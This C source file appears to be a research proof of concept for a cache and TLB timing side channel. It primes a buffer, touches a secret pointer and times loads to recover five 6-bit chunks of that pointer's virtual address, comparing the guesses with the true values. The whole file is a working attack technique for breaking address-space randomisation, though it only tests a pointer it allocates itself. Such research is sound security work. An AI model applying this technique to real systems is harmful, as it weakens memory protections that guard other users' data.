/* Copyright (c) 2025, Google Inc.
 *
 * Permission to use, copy, modify, and/or distribute this software for any
 * purpose with or without fee is hereby granted, provided that the above
 * copyright notice and this permission notice appear in all copies.
 *
 * THE SOFTWARE IS PROVIDED "AS IS" AND THE AUTHOR DISCLAIMS ALL WARRANTIES
 * WITH REGARD TO THIS SOFTWARE INCLUDING ALL IMPLIED WARRANTIES OF
 * MERCHANTABILITY AND FITNESS. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY
 * SPECIAL, DIRECT, INDIRECT, OR CONSEQUENTIAL DAMAGES OR ANY DAMAGES
 * WHATSOEVER RESULTING FROM LOSS OF USE, DATA OR PROFITS, WHETHER IN AN ACTION
 * OF CONTRACT, NEGLIGENCE OR OTHER TORTIOUS ACTION, ARISING OUT OF OR IN
 * CONNECTION WITH THE USE OR PERFORMANCE OF THIS SOFTWARE. */

#include "lib.h"

typedef struct delta_index {
  int delta;
  int index;
} delta_index;

int cmp_di(const void* a, const void* b) {
  const delta_index* aa = a;
  const delta_index* bb = b;
  if (aa->delta > bb->delta) return -1;
  if (aa->delta < bb->delta) return 1;
  return 0;
}

int main(int argc, char** argv) {
  init(argc, argv);

#define NUM_EVICT (2048)
  // Always at the same place, can allocate once forever.
  char* eviction_pointers[NUM_EVICT];
  for (int i = 0; i < NUM_EVICT; i++) {
    // 0xfc-0xff (one L0 cache line) is stack area, which is already pretty noisy. Let's allocate
    // eviction buffer here, since we wouldn't be able to leak anything reliably
    // from here anyway.
#if defined(__x86_64__)
    eviction_pointers[i] = alloc_random_page_(0x0000007FffffF000ull, ((long long)0x7d) << 40);
#elif defined(__aarch64__)
    eviction_pointers[i] = alloc_random_page_(0x0000007FffffF000ull, ((long long)0xfd) << 40);
#endif
  }

#define PRIME_SZ (4096 * 8 * 1)
  // Needs to be page aligned.
  char* evbuffer = alloc_random_pages(PRIME_SZ);

#define DEBUG_MODE 1

  char* secret_ptr = alloc_random_page() + (xorshift128() & 4095);
  uintptr_t secret_uptr = (uintptr_t)secret_ptr;
#define ITERS 10000
  char* test_ptrs[ITERS * 2];
  for (int i = 0; i < ITERS; i++) {
    test_ptrs[i * 2] = alloc_random_page() + (xorshift128() & 4095);
    test_ptrs[i * 2 + 1] = secret_ptr;
  }


#define ACCESS_SECRET(p) volatile char dummy_char = *(volatile char*)p;
  printf("Debug: secret = %p\n", secret_ptr);

  int sumtimings[PRIME_SZ / 64] = {0};
  int sumfaketimings[PRIME_SZ / 64] = {0};
  for (int iter = 0; iter < ITERS * 2; iter++) {
    int timings[PRIME_SZ / 64] = {0};
    uint32_t aa = xorshift128();
    uint32_t aainc = xorshift128() | 1;
    uint32_t bb = xorshift128();
    uint32_t bbinc = xorshift128() | 1;

    // Thrash TLB.
    for (int i = 0; i < NUM_EVICT; i++) {
      eviction_pointers[i][0] = 0x41;
    }

    // Prime.
    for (int i = 0; i < PRIME_SZ / 64; i++) {
      evbuffer[i * 64] = 0x41;
    }

    // Access secret.

    mfence();
    ACCESS_SECRET(test_ptrs[iter]);
    mfence();

    // Time.

    uint32_t i = aa;
    for (int j = 0; j < PRIME_SZ / 64; j++) {
      i &= PRIME_SZ / 64 - 1;
      timings[i] = time_load(evbuffer + i * 64);
      i += aainc;
    }

    for (int i = 0; i < PRIME_SZ / 64; i++) {
      if (timings[i] > 600) timings[i] = 600;
      if (iter % 2 == 1) {
        sumtimings[i % 64] += timings[i];
      }
      else {
        sumfaketimings[i % 64] += timings[i];
      }
    }
  }
  delta_index dis[64];
  int true_vals[5] = {
    (secret_uptr >> 42)&63,
    (secret_uptr >> 33)&63,
    (secret_uptr >> 24)&63,
    (secret_uptr >> 15)&63,
    (secret_uptr >> 6)&63,
  };
  for (int i = 0; i < 64; i++) {
    char c1 = i == ((secret_uptr >> 42)&63) ? '1' : ' ';
    char c2 = i == ((secret_uptr >> 33)&63) ? '2' : ' ';
    char c3 = i == ((secret_uptr >> 24)&63) ? '3' : ' ';
    char c4 = i == ((secret_uptr >> 15)&63) ? '4' : ' ';
    char c5 = i == ((secret_uptr >> 6)&63)  ? '5' : ' ';
    printf("%03d: %d-%d=% 7d [%c%c%c%c%c]\n", i, sumtimings[i], sumfaketimings[i], sumtimings[i] - sumfaketimings[i], c1, c2, c3, c4, c5);
    dis[i].delta = sumtimings[i] - sumfaketimings[i];
    dis[i].index = i;
  }
  qsort(dis, 64, sizeof(dis[0]), cmp_di);

  printf("Best guesses: ");
  for (int i = 0; i < 5; i++) {
    printf("%02x ", dis[i].index);
  }
  printf(" (order unknown)\n");
  printf(" True values: ");
  for (int i = 0; i < 5; i++) {
    printf("%02x ", true_vals[i]);
  }
  printf("\n");

}
